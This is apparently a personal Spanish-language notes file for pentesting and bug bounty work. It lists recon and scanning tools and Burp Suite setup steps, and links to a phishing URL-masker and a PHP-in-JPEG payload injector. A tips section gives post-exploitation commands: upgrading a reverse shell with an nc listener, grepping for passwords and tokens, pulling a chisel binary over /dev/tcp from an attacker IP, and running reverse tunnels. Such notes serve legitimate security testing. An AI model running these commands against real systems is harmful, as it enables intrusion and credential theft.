# Varias cositas  

## Herramientas varias  

Asciinema - grabar consola  
https://asciinema.org/


Extensions Hack Tools  
https://chrome.google.com/webstore/detail/hack-tools/cmbndhnoonmghfofefkcccljbkdpamhi   
https://addons.mozilla.org/es/firefox/addon/hacktools/ 


VulnMap  
Escaner de vulnerabilidades web  
https://github.com/zhzyker/vulmap
https://securityonline.info/vulmap-web-vulnerability-scanning-and-verification-tools/


PEASS  
Suite para escalar privilegios  
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite 


Maltego  
Permite realizar OSINT en función de diversos datos y crear búsquedas personalizadas  
https://www.maltego.com/


NahamSec Resources  
https://github.com/nahamsec/Resources-for-Beginner-Bug-Bounty-Hunters


Inyeccion de código PHP en imágenes  
https://github.com/dlegs/php-jpeg-injector
https://securityonline.info/php-jpeg-injector-injects-php-payloads-into-jpeg-images/


Enmascarar URL's para hacer phishing  
https://github.com/jaykali/maskphish
https://kalilinuxtutorials.com/maskphish/


Escaner de vulnerabilidades en docker  
https://github.com/aquasecurity/trivy 


Imágen de Docker para hacer reconocimiento de Bug Bounty
https://github.com/chvancooten/BugBountyScanner


OSMEDEUS  
Reconocimiento automático y escaneo en pruebas de Penetración.  
https://j3ssie.github.io/Osmedeus/  
https://github.com/j3ssie/Osmedeus  


GitDorker  
Busca en repositorios de github si hay información sensible  
https://github.com/obheda12/GitDorker


Admin Scanner  
Busca paneles de acceso a administracion en sitios web.  
https://github.com/alienwhatever/Admin-Scanner


CyberChef  
Utilidades de conversión  
https://gchq.github.io/CyberChef/


OneLiners para BugBounty  
https://github.com/KingOfBugbounty/KingOfBugBountyTips  

https://github.com/twseptian/oneliner-bugbounty  

Oneliner para buscar patrones en todos los objetos de un repositorio GIT (by @tomnomnom)  
{ find .git/objects/pack/ -name "*.idx"|while read i;do git show-index < "$i"|awk '{print $2}';done;find .git/objects/ -type f|grep -v '/pack/'|awk -F'/' '{print $(NF-1)$NF}'; }|while read o;do git cat-file -p $o;done|grep -E '<pattern>'  

Recopilado de tools  
https://start.me/p/m6XMmk/ethical-hacking


Comandos utiles de consola para pentesting  
https://securityonline.info/some-useful-linux-command-for-your-penetration-testinglinux-command/


Extensiones para Burp recomendadas por Akita:  
- Param Miner
- Content-Type Converter
- Upload Scanner
- SAML Raider
- JSON Web Tokens

Listas para descubrir mas extensiones Burp y Zap  
https://github.com/hahwul/WebHackersWeapons/tree/master/Burp%20and%20ZAP%20Extensions 

https://github.com/snoopysecurity/awesome-burp-extensions

https://github.com/sting8k/BurpSuite_403Bypasser 

HopLa  
All the power of PayloadsAllTheThings, without the overhead. This extension adds autocompletion support and useful payloads in Burp Suite to make your intrusion easier.  
https://github.com/synacktiv/HopLa  


WHM Tools  
Desde una web, seleccionando q herramientas queremos, crea un instalador de las mismas  
https://whw-tools.hahwul.com/  


Herramientas utiles para explotacion  
Por ejemplo servicios online que quedan a la espera de request y podemos ver el contenido, headers, etc del request recibido  
Alternativas a Burp Collaborator  
https://webhook.site 
https://requestcatcher.com 
http://dnsbin.zhack.ca 
https://ngrok.com 
http://interact.sh/  
https://dnslog.cn   
https://webhook.site  
https://interact.projectdiscovery.io  
https://pingb.in  
https://swin.es  
https://ceye.io  
https://canarytokens.org  
https://requestbin.net  
https://beeceptor.com  


Hetty  
Alternativa open source a Burp Suite  
https://github.com/dstotijn/hetty  


Blue Team  
https://github.com/BlueTeamLabs/sentinel-attack  
https://github.com/mitre/caldera   

BlueTeam Training Toolkit  
https://www.youtube.com/playlist?list=PLUANA2JtKjNs1Bjwdt86hG215QKsoDorO   
https://www.bt3.no/   


Scripts para busquedas de logs, archivos de configuracion, emails, etc  
https://github.com/daffainfo/Bug-Bounty-Tools  


All about bug bounty
Payloads, Bypass, herramientas de recon, etc  
https://github.com/daffainfo/AllAboutBugBounty  


SubDomainizer  
Es una herramienta para buscar subdominios ocultos, y secret keys  
https://github.com/nsonaniya2010/SubDomainizer  


GitDorker  
Es una herramienta para usar la api de busqueda de github información sensible.  
https://github.com/obheda12/GitDorker/    
https://obheda12.medium.com/gitdorker-a-new-tool-for-manual-github-dorking-and-easy-bug-bounty-wins-92a0a0a6b8d5  

TLD extensiones de dominios  
https://raw.githubusercontent.com/DragonJAR/Scripts/master/all-domain-extensions.txt  


Offensive Docker  
https://github.com/aaaguirrep/offensive-docker  


Search in Google  
https://www.exploit-db.com/google-hacking-database  


Hacks to search in Google Dorks  
https://pentest-tools.com/information-gathering/google-hacking  


Nuclei  
https://github.com/projectdiscovery/nuclei  
https://www.youtube.com/watch?v=KNM9oNPYikY  
https://www.youtube.com/watch?v=2girdFTMYLY  
https://www.youtube.com/watch?v=ZcG8ARatgs0  


Awesome Bug Bounty Tools Awesome  
A curated list of various bug bounty tools   
https://github.com/vavkamil/awesome-bugbounty-tools  


Spyse  
Recon de hosts, busca con diferentes sufijos , subdominios, tira también CVE 
https://spyse.com/  

JS tools  
https://github.com/GerbenJavado/LinkFinder  
https://github.com/m4ll0k/SecretFinder  
https://github.com/Sh1Yo/x8  


Mails Temporales  
https://www.guerrillamail.com/  



## Tips  

### Comandos al ingresar por shell (reverse shell)  

whoami  
ifconfig o ip a  
  
script /dev/null -c bash  
^Z  
stty raw echo -echo; fg  
nc -nlvp 443  
reset  

terminal ? xterm  
export TERM=xterm  
export SHELL=bash  

en una ventana mia ejecutar: stty -a   
Y ver la cantidad de filas y columnas, para configurar lo mismo en la maquina remota  
stty rows 53 columns 206  

Buscamos credenciales  
grep -r -i -E "user|pass|key|token"  

Buscamos archivos   
find \-type f 2>/dev/null  

Script en python:  
https://pastebin.com/5GqY54FG  

### Chisel  
https://github.com/jpillora/chisel  

truco para compilar a bajo peso:  
go build -ldflags "-s -w"  
du -hc chisel  
upx brute chisel  
du -hc chisel  

> upx comprime binarios

desde maquina local hacer:  
nc -lnvp 443 < chisel  
y en maquina virtual:  
cat > chisel < /dev/tcp/ipxxx/443

maquina local:  
./chisel server --reverse -p puerto    

maquina ataque:  
./chisel client ip:puerto  

### Borrado seguro de archivos  
scrub y shred  

### TMUX  
Oh My TMUX  
https://github.com/gpakosz/.tmux  

Cheat Sheet  
https://gist.github.com/anibalardid/d5db8be18cabafe9fc8eea28c3fae2f7  


### Steghide - Esteganografía  
Buscar contenido en las imágenes  

http://steghide.sourceforge.net/  
https://fwhibbit.es/steghide-brute-force-tool  
https://github.com/Va5c0/Steghide-Brute-Force-Tool  
https://github.com/Paradoxis/StegCracker  


### Estrategias/Métodologías de Bug Bounty

- Opción 1  
  amass->httpx->gau->kxss  
https://github.com/OWASP/Amass  
https://github.com/projectdiscovery/httpx  
https://github.com/lc/gau  
https://github.com/tomnomnom/hacks/tree/master/kxss  
https://github.com/Emoe/kxss  

GF Patterns:  
```bash
git clone https://github.com/1ndianl33t/Gf-Patterns
mkdir .gf
mv ~/Gf-Patterns/*.json ~/.gf 
```


Pasos:  
```bash
amass enum -passive -d hilton.com -noalts -o hosts.txt  
#cat hosts.txt | httpx   
httpx -l hosts.txt -silent > httpx.txt
# subfinder -d hackerone.com | httpx -title -tech-detect -status-code -title -follow-redirects


```  

- Opción 2
https://www.infosecmatter.com/bug-bounty-tips-8-oct-14/#7_simple_reflected_xss_scenario  

Run  
subfinder -d target.com | httprobe -c 100 > target.txt  
Run  
cat target.txt | waybackurls | gf xss | kxss  
Got a URL which had all the special characters unfiltered and the parameter was callback=  

- Opción 3
https://twitter.com/nullenc0de/status/1236047455831101446  

Methodology:  
1) Identify bug bounty  
2) Enumerate sub domains (I use amass, subfinder)  
3) Feed those to httpprobe  
4) Feed that list to a crawling tool  (hakcrawler)  
5) Feed that list to kxss  
6) grep output for " (easiest win)  

assetfinder target.com | hakrawler | kxss 

- Opción 4 
1) Buscar si hay una página de registro y login. Probar registrarse o loguearse, incluyendo probar:
   1)  XSS
   2)  Probar diferentes vectores de ataques en cualquier input q se prueda probar
2)  Ingresar o registrarse como un usuario normal
    1)  monitorizando todo con Burp suite o similar
    2)  tomar nota , haciendo un mapa mental
3)  Prestar atencion a permisos, diferentes secciones de la aplicación, comunicacion con otras aplicaciones, etc
4)  Revisar si la web tiene un manual, buscarlo con google dorks
5)  Si usas Burp Suite Pro , puede arrojar falsos positivos, por lo cual, todo tiene q ser reproducible y demostrar un impacto.
6)  

## Como usar Burp Suite

### Configuración inicial
1) Instalar en el browser Foxy Proxy (o configurar a mano el proxy)
2) La config del proxy se encuentra en Proxy - Options 
3) Exportar el archivo del certificado .der
4) Importar certificado en el browser, en la sección de entidades , debe preguntar opciones al importar
5) Probar encender el proxy y cargar una web https para probar q funcione el certificado
6) En Burp en Proxy - Intercept , si esta en ON, podremos ir viendo los requests y responses, avanzando con el boton de Forward

### Uso Básico
1) Encender proxy
2) Poner Intercept en Off , hasta que querramos empezar a interceptar
3) Ir a la solapa TARGET y en Scope especificar la url, o con la opcion Avanzada elegir un regex
4) Luego en Proxy, ir a Opciones, y ahi poner AND en las opciones de Intercept Client Request
5) 



